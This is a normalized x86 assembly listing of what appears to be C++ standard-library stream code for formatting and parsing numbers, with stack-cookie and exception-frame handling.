mov ebx ecx
push eax
push r--data
lea eax [ esp + 0x20 ]
push eax
push ebx
call sub_1000b416
add esp 0x10
push eax
lea eax [ esp + 0x24 ]
push 0x40
push eax
call sub_10024bfa
push eax
lea eax [ esp + 0x30 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_1000b48a
mov ecx [ esp + 0x90 ]
add esp 0x34
mov eax edi
pop edi
pop esi
pop ebx
xor ecx esp
call sub_100242d7
mov esp ebp
pop ebp
retn 0x1c
sub_1000a1d1
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x94
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x90 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ esp + 0x18 ] ecx
mov ecx [ esi + 0x14 ]
xor ebx ebx
cmp ecx ebx
mov [ esp + 0x14 ] eax
push edi
mov eax 0x2000
jg r-xdata
mov edi ecx
push 0x24
pop ecx
cmp edi ecx
mov [ esp + 0x20 ] ecx
jg r-xdata
test [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ esi + 0x10 ]
fld [ ebp + 0x1c ]
sub edi [ esp + 0x20 ]
mov edx ecx
and edx 0x3000
mov [ esp + 0x14 ] ebx
cmp edx eax
jne r-xdata
mov [ esp + 0x20 ] edi
push 0x6
pop ecx
push ecx
push ecx
fstp [ esp ]
push [ esp + 0x28 ]
lea eax [ esp + 0x2c ]
push ecx
push 0x0
push eax
push [ esp + 0x34 ]
call sub_1000aee8
add esp 0x10
push eax
lea eax [ esp + 0x38 ]
push 0x6c
push eax
call sub_10024bfa
push eax
push edi
push ebx
push [ esp + 0x38 ]
lea eax [ esp + 0x50 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ esp + 0x54 ]
push [ esp + 0x5c ]
call sub_1000af4c
mov ecx [ esp + 0xe0 ]
mov eax [ esp + 0x5c ]
add esp 0x44
pop edi
pop esi
pop ebx
xor ecx esp
call sub_100242d7
mov esp ebp
pop ebp
retn 0x1c
fld [ r--data ]
fmul st1
fucomp st1
fnstsw ax
test ah 0x44
jpo r-xdata
fldz
fcom st1
fnstsw ax
test ah 0x41
jne r-xdata
mov [ esp + 0x13 ] bl
fxch st1
fxch st1
mov [ esp + 0x13 ] 0x1
fchs
jmp r-xdata
cmp [ esp + 0x14 ] 0x1388
jae r-xdata
fstp st1
jmp r-xdata
fld [ r--data ]
push 0xa
fcom st1
pop edx
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
fdiv st2
add [ esp + 0x14 ] edx
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ esp + 0x13 ] 0x0
fstp st1
je r-xdata
cmp edi edx
jl r-xdata
fchs
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp ebx 0x1388
jae r-xdata
sub edi edx
fmul st1
add ebx edx
jmp r-xdata
sub_1000a351
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x94
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x90 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ esp + 0x18 ] ecx
mov ecx [ esi + 0x14 ]
mov [ esp + 0x14 ] eax
push edi
mov eax 0x2000
test ecx ecx
jg r-xdata
mov edi ecx
push 0x24
pop ecx
cmp edi ecx
mov [ esp + 0x20 ] ecx
jg r-xdata
test [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ esi + 0x10 ]
sub edi [ esp + 0x20 ]
and [ esp + 0x10 ] 0x0
and [ esp + 0x14 ] 0x0
mov edx ecx
and edx 0x3000
cmp edx eax
jne r-xdata
mov [ esp + 0x20 ] edi
push 0x6
pop ecx
fld [ ebp + 0x1c ]
fldz
fld [ ebp + 0x1c ]
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
mov [ esp + 0xf ] 0x0
jmp r-xdata
mov [ esp + 0xf ] 0x1
fchs
fld [ r--data ]
push 0xa
fcom st1
mov ebx 0x1388
pop edx
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
cmp [ esp + 0x10 ] ebx
jae r-xdata
fstp st1
jmp r-xdata
fdiv st2
add [ esp + 0x10 ] edx
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ esp + 0xf ] 0x0
fstp st1
je r-xdata
cmp edi edx
jl r-xdata
push ecx
push ecx
fstp [ esp ]
push [ esp + 0x28 ]
lea eax [ esp + 0x2c ]
push ecx
push 0x4c
push eax
push [ esp + 0x34 ]
call sub_1000aee8
add esp 0x10
push eax
lea eax [ esp + 0x38 ]
push 0x6c
push eax
call sub_10024bfa
push eax
push edi
push [ esp + 0x34 ]
lea eax [ esp + 0x4c ]
push [ esp + 0x34 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ esp + 0x54 ]
push [ esp + 0x5c ]
call sub_1000af4c
mov ecx [ esp + 0xe0 ]
mov eax [ esp + 0x5c ]
add esp 0x44
pop edi
pop esi
pop ebx
xor ecx esp
call sub_100242d7
mov esp ebp
pop ebp
retn 0x1c
fchs
jmp r-xdata
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp [ esp + 0x14 ] ebx
jae r-xdata
sub edi edx
fmul st1
add [ esp + 0x14 ] edx
jmp r-xdata
sub_1000a4c6
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x4c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x48 ] eax
mov eax [ ebp + 0x1c ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
push eax
push r--data
lea eax [ esp + 0x18 ]
push 0x40
push eax
mov ebx ecx
call sub_10024bfa
push eax
lea eax [ esp + 0x24 ]
push eax
push [ ebp + 0x18 ]
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push ebx
call sub_1000b48a
mov ecx [ esp + 0x84 ]
add esp 0x30
pop edi
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_100242d7
mov esp ebp
pop ebp
retn 0x18
sub_1000a52d
push 0x60
mov eax sub_1004d6ca
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
or [ ebp - 0x50 ] 0xffffffff
mov [ ebp - 0x68 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0x24 ]
xor ebx ebx
mov [ ebp - 0x6c ] eax
mov eax [ esi + 0x10 ]
inc ebx
mov [ ebp - 0x54 ] ecx
mov ecx esi
test eax 0x4000
je r-xdata
lea eax [ ebp - 0x60 ]
xor edi edi
push eax
mov [ ebp - 0x5c ] edi
call sub_10003446
lea ecx [ ebp - 0x5c ]
push ecx
push eax
mov [ ebp - 0x4 ] 0x4
mov esi [ esi + 0x10 ]
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x54 ]
call sub_1000b703
add esp 0x18
push eax
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10023ad9
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x60 ]
mov esi eax
call sub_10003c49
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x64 ] eax
je r-xdata
lea eax [ ebp - 0x54 ]
push eax
call sub_10003446
xor edi edi
push eax
mov [ ebp - 0x4 ] edi
call sub_1000c26d
pop ecx
or esi 0xffffffff
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] esi
call sub_10003c49
push edi
push ebx
lea ecx [ ebp - 0x4c ]
call sub_100079fe
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] ebx
call sub_1000be24
push esi
push edi
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x2
call sub_100086af
push edi
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_10002020
push edi
push ebx
lea ecx [ ebp - 0x4c ]
call sub_10007a24
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000be3b
push esi
push edi
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x3
call sub_100086af
push edi
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_10002020
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1000c5af
test al al
mov eax [ ebp - 0x58 ]
je r-xdata
cmp [ ebp - 0x5c ] edi
jne r-xdata
push eax
push 0x2
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1000c30a
add esp 0x10
push edi
push ebx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] esi
call sub_10002020
jmp r-xdata
lea eax [ ebp - 0x48 ]
cmp [ ebp - 0x50 ] edi
jge r-xdata
or [ eax ] ebx
cmp esi ebx
ja r-xdata
mov ecx [ ebp - 0x6c ]
setne al
mov [ ecx ] al
or [ eax ] 0x2
jmp r-xdata
mov [ ebp - 0x50 ] esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x68 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100282ef
retn 0x20
sub_1000a6cb
push 0x38
mov eax sub_1004d927
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10003446
and [ ebp - 0x4 ] 0x0
mov esi [ esi + 0x10 ]
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_1000b703
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_10003c49
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10023ad9
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1000c5af
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] si
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100282ef
retn 0x20
sub_1000a79a
push 0x38
mov eax sub_1004d927
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10003446
and [ ebp - 0x4 ] 0x0
mov esi [ esi + 0x10 ]
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_1000b703
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_10003c49
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10023ad9
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1000c5af
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffffffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100282ef
retn 0x20
sub_1000a865
push 0x38
mov eax sub_1004d8fa
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10003446
and [ ebp - 0x4 ] 0x0
mov esi [ esi + 0x10 ]
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1000b703
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10023c74
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_10003c49
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1000c5af
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100282ef
retn 0x20
sub_1000a913
push 0x38
mov eax sub_1004d8fa
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10003446
and [ ebp - 0x4 ] 0x0
mov esi [ esi + 0x10 ]
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1000b703
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10023ad9
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_10003c49
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1000c5af
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100282ef
retn 0x20
sub_1000a9c1
push 0x3c
mov eax sub_1004d67d
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10003446
and [ ebp - 0x4 ] 0x0
mov esi [ esi + 0x10 ]
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1000b703
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10023d19
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_10003c49
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1000c5af
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100282ef
retn 0x20
sub_1000aa78
push 0x3c
mov eax sub_1004d67d
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10003446
and [ ebp - 0x4 ] 0x0
mov esi [ esi + 0x10 ]
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1000b703
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10023ddc
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_10003c49
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1000c5af
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100282ef
retn 0x20
sub_1000ab2f
push 0x50
mov eax sub_1004d8cd
call sub_1002826c
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x54 ] 0x0
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x50 ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10003446
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x54 ]
push ecx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp - 0x50 ]
call sub_1000b9ca
add esp 0x14
push eax
lea eax [ ebp - 0x5c ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_10023fe1
fstp [ ebp - 0x50 ]
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x58 ]
call sub_10003c49
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1000c5af
test al al
je r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x5c ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
fld [ ebp - 0x50 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
call sub_100282ef
retn 0x20
sub_1000abd7
push 0x54
mov eax sub_1004d8a0
call sub_1002826c
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x50 ] 0x0
lea eax [ ebp - 0x54 ]
mov [ ebp - 0x5c ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10003446
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x50 ]
push ecx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp - 0x5c ]
call sub_1000b9ca
add esp 0x14
push eax
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_10024003
fstp [ ebp - 0x60 ]
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x54 ]
call sub_10003c49
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1000c5af
test al al
je r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x58 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
fld [ ebp - 0x60 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
call sub_100282ef
retn 0x20
sub_1000ac7f
push 0x54
mov eax sub_1004d8a0
call sub_1002826c
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x50 ] 0x0
lea eax [ ebp - 0x54 ]
mov [ ebp - 0x5c ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10003446
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x50 ]
push ecx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp - 0x5c ]
call sub_1000b9ca
add esp 0x14
push eax
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_1002406c
fstp [ ebp - 0x60 ]
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x54 ]
call sub_10003c49
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1000c5af
test al al
je r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x58 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
fld [ ebp - 0x60 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
call sub_100282ef
retn 0x20
sub_1000ad27
push 0x38
mov eax sub_1004c597
call sub_1002826c
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x3c ] 0x0
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10003446
and [ ebp - 0x4 ] 0x0
push eax
push 0x800
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_1000b703
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x34 ] eax
call sub_10003c49
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x34 ]
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10023ad9
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x38 ] eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1000c5af
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
mov eax [ ebp - 0x38 ]
mov [ edi ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x4 ] eax
mov eax ebx
call sub_100282ef
retn 0x20
sub_1000addd
push 0x4
mov eax sub_1004e847
call sub_10028203
mov esi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
mov eax [ esi ]
mov eax [ eax + 0x4 ]
push [ ebp + 0xc ]
mov [ esi + eax ] r--data
mov eax [ esi ]
and [ esi + 0x4 ] 0x0
mov ecx [ eax + 0x4 ]
add ecx esi
call sub_1000beda
mov eax esi
call sub_100282db
retn 0x8
sub_1000ae19
push 0x0
mov eax sub_1004cb27
call sub_10028203
mov esi [ ebp + 0x8 ]
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
call sub_100230fb
and [ ebp - 0x4 ] 0x0
push 0x4
call sub_10024389
pop ecx
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_10003a7e
jmp r-xdata
mov [ esi + 0x38 ] eax
mov eax esi
call sub_1000bf46
mov eax esi
call sub_100282db
retn 0x4
sub_1000ae65
mov eax [ esi + 0x40 ]
and eax 0x6
cmp al 0x6
je r-xdata
retn 0x4
push edi
push 0x0
push ebx
call sub_10001da6
push ebx
push [ esp + 0x14 ]
mov edi eax
push ebx
push edi
call sub_10001fe8
add esp 0x18
test [ esi + 0x40 ] 0x4
lea eax [ edi + ebx ]
mov [ esi + 0x3c ] eax
jne r-xdata
mov ecx [ esi + 0x40 ]
test cl 0x2
jne r-xdata
mov ecx [ esi + 0x10 ]
mov [ ecx ] edi
mov ecx [ esi + 0x20 ]
mov [ ecx ] edi
mov ecx [ esi + 0x30 ]
mov [ ecx ] ebx
or [ esi + 0x40 ] 0x1
pop edi
test cl 0x10
jne r-xdata
mov ecx [ esi + 0x14 ]
mov [ ecx ] edi
mov ecx [ esi + 0x24 ]
mov [ ecx ] eax
mov ecx edi
sub ecx eax
mov eax [ esi + 0x34 ]
add ecx ebx
mov [ eax ] ecx
mov eax [ esi + 0x20 ]
cmp [ eax ] 0x0
jne r-xdata
mov eax edi
mov eax [ esi + 0x10 ]
mov [ eax ] edi
mov eax [ esi + 0x20 ]
and [ eax ] 0x0
mov eax [ esi + 0x30 ]
mov [ eax ] edi
sub_1000aee8
mov eax [ esp + 0x8 ]
push ebx
mov ebx [ esp + 0x14 ]
mov [ eax ] 0x25
lea ecx [ eax + 0x1 ]
test bl 0x20
je r-xdata
test bl 0x10
je r-xdata
mov [ ecx ] 0x2b
inc ecx
mov dl [ esp + 0x10 ]
mov [ ecx ] 0x2e
inc ecx
mov [ ecx ] 0x2a
inc ecx
test dl dl
je r-xdata
mov [ ecx ] 0x23
inc ecx
mov edx 0x3000
and ebx edx
cmp ebx 0x2000
jne r-xdata
mov [ ecx ] dl
inc ecx
cmp ebx edx
jne r-xdata
mov dl 0x66
jmp r-xdata
cmp ebx 0x1000
setne dl
lea edx [ edx + edx + 0x65 ]
mov dl 0x61
jmp r-xdata
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
retn
sub_1000af4c
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004d64d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x70
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x68 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x80 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
mov edi [ ebp + 0x20 ]
mov [ esp + 0x30 ] eax
lea eax [ esp + 0x3c ]
push eax
mov [ esp + 0x30 ] ecx
call sub_10003446
xor ebx ebx
push eax
mov [ esp + 0x8c ] ebx
call sub_1000c26d
or [ esp + 0x8c ] 0xffffffff
pop ecx
mov esi eax
lea ecx [ esp + 0x3c ]
mov [ esp + 0x24 ] esi
call sub_10003c49
lea eax [ esp + 0x5c ]
push eax
mov ecx esi
call sub_1000c088
